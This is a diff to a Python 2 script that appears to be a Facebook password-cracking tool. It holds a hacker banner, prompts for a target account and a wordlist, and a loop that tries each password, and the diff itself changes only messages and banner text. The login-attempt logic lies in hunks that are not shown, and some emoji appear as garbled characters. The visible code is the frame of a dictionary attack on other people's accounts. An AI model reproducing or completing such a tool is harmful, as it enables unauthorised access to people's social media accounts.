@@ -10,7 +10,7 @@ except ModuleNotFoundError:
     print '[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2'
     exit()
 os.system("clear")
-print"""
+print """
 ______________________________________________________ |
 |.            Name:  Shahidullah Taraki                                      |
 |.                       Friend.  Mjawad Akram.                             |
@@ -26,28 +26,27 @@ ______________________________________________________ |
 |.                                                                                                 |
 _______________________________________________________
 ##############] Coded By Shahid ullah Taraki [##############|
-\033[1;97m           [🇦🇫\033.  Devlup Shahid   🇦🇫\033[1;97m]
+\033[1;97m           [ðŸ‡¦ðŸ‡«\033.  Devlup Shahid   ðŸ‡¦ðŸ‡«\033[1;97m]
 \033[1;97m           [
-\033[1;97m           [Youtube: Technical Shahid 💎\033[1;97m]          
-\033[1;47m\033[1;35m          Afghan Hacker Tool               \033[1;0m
-"""
+\033[1;97m           [Youtube: Technical Shahid ðŸ’Ž\033[1;97m]          
+\033[1;47m\033[1;35m          Iam Junior               \033[1;0m
+\033[1;47m\033[1;35m          Enter Facebook Account User Name                 \033[1;0m
+"""    
 time.sleep(0.5)
-user = raw_input('[+] Target Account/ID/Email : ')
+user = raw_input('[+] Target Account Email/Number/Id : ')
 time.sleep(0.8)
 wrdlstFileName = raw_input('\n[+] Enter Wordlist Directory : ')
 try:
     wordlist = open(wrdlstFileName, 'r')
 except FileNotFoundError:
-    print ('\n[!] File Not Found
-Please Enter pass.txt
-!')
+    print ('\n[!] File Not Found!')
     exit()
 
 time.sleep(0.8)
-print '\n\nCracking '+user+' Now...'
+print '\n\nCracking Start'+user+' Now...'
 
 time.sleep(1)
-print '\033[1;47m\033[1;31m               Attack Is started    By shahid Omar             \033[1;0m   '
+print '\033[1;47m\033[1;31m               Attack Has been started                 \033[1;0m   '
 for password in wordlist:
     if password == '' or password == ' ':
         pass
@@ -80,7 +79,7 @@ for password in wordlist:
             exit()
 
 time.sleep(1)
-print 'Sorry, none of the passswords in your wordlist is right. Now'
+print 'Sorry, none of the passswords in your wordlist is right.'
 time.sleep(0.8)
 dos.close()
 os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
